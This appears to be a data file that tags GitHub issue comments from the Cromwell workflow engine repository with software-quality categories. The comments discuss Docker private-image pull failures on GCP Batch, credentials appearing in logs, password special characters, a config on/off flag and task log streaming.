logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:224,Testability,log,log,224,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:325,Testability,test,test,325,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:1074,Testability,test,test,1074,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:1342,Testability,test,test,1342,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:1705,Testability,log,logs,1705,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:489,Availability,error,error,489,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:510,Availability,Error,Error,510,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:543,Security,access,access,543,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:667,Security,access,access,667,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:747,Security,access,access,747,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:152,Testability,assert,assert,152,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:641,Testability,log,login,641,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:78,Security,password,password,78,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:110,Security,password,password,110,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:154,Security,password,password,154,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655
https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:226,Testability,log,login,226,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:122,Deployability,release,release,122,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:255,Modifiability,config,config,255,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:343,Modifiability,config,config,343,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:411,Modifiability,config,config,411,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:486,Modifiability,config,config,486,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:548,Usability,clear,clear,548,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2338996378:80,Testability,log,log,80,"Hi Alex, in our sync meetings we discussed an aysnc ""sidecar"" type solution for log file syncing, much like PAPI v2 has now. We were concerned that mounting a GCS filesystem that includes potentially large task files might consume a lot of bandwidth as these files are written. Streaming of files other than task logs are not necessary for our use cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2338996378
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2338996378:313,Testability,log,logs,313,"Hi Alex, in our sync meetings we discussed an aysnc ""sidecar"" type solution for log file syncing, much like PAPI v2 has now. We were concerned that mounting a GCS filesystem that includes potentially large task files might consume a lot of bandwidth as these files are written. Streaming of files other than task logs are not necessary for our use cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2338996378
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2339050816:35,Testability,log,logs,35,The mounted GCS bucket is only for logs. The outputs still go through delocalization. There is not an option to do a sidecar within GCP Batch. Google would have to enable it within the product. We have asked and the response was this to do it this way.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2339050816
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:67,Testability,log,log,67,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:232,Testability,log,log,232,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:386,Testability,log,log,386,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:398,Testability,log,log,398,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:489,Testability,log,log,489,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:532,Testability,log,log,532,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:570,Testability,log,log,570,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:694,Testability,log,log,694,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
